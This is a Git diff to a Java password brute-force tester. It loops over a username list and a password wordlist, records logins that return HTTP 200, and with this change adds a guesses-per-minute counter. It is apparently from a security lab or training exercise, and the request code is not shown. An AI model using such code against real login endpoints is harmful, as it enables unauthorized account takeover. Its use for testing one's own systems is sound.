@@ -26,10 +26,15 @@ import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.Base64;
 import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
 public class BruteForceTester {
-	private static HttpSupport http = new HttpSupport();
-	private static Base64.Encoder encoder = Base64.getEncoder();
+	static HttpSupport http = new HttpSupport();
+	static Base64.Encoder encoder = Base64.getEncoder();
+
+	static long start = System.currentTimeMillis();
+	static int count = 0;
 
 	private static class Result {
 		String username;
@@ -43,9 +48,10 @@ public class BruteForceTester {
 		}
 
 		public void print() {
-			String message = String.format("%s:%s -> %d", this.username, this.password, this.status);
+			String message = String.format("%s:%s -> %d",
+					this.username, this.password, this.status);
 			if ( this.status == 200 ) {
-				System.out.println(message);
+				System.err.println(message);
 			}
 		}
 	}
@@ -66,17 +72,26 @@ public class BruteForceTester {
 		}
 	}
 
+	private static void results(Result result) {
+		result.print();
+
+		count++;
+		if ( System.currentTimeMillis() - start > 60000 ) {
+			System.out.printf("%d guesses in the last minute%n", count);
+			count = 0;
+			start = System.currentTimeMillis();
+		}
+	}
+
 	public static void main(String[] args) throws IOException {
-		try (
-				BufferedReader passwords = new BufferedReader(
-						new FileReader(args[1]));
-				) {
+		try (BufferedReader passwords =
+					 new BufferedReader(new FileReader(args[1]))) {
 
 			List<String> usernames = Files.readAllLines(Paths.get(args[0]));
 			for ( String username : usernames ) {
 				passwords.lines()
-						.map(password -> login(username, password))
-						.forEach(Result::print);
+					.map(password -> login(username, password))
+					.forEach(BruteForceTester::results);
 			}
 		}
 	}
